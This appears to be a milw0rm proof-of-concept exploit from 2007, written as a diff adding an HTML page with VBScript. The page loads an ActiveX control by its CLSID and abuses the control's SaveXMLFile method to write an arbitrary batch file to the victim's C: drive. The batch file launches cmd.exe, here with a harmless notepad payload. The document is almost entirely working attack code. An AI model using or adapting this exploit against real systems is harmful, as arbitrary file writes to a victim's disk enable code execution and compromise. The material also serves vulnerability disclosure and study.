@@ -1,0 +1,20 @@
+<object classid='clsid:A0D43FB0-116B-47AB-80FB-6DCFA92A03E3' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  Dim mStr
+  Dim MyMsg  
+   mStr = "echo off" & vbCrLf & _
+          "cls" & vbCrLf & _
+          "echo Hello World!" & vbCrLf & _
+          "cmd.exe /c notepad.exe" & vbCrLf & _
+          "pause"
+
+   test.SaveXMLFile "c:\shinnai.bat", mStr
+   MyMsg = MsgBox("Exploit completed!")
+ End Sub
+</script>
+
+# milw0rm.com [2007-08-27]
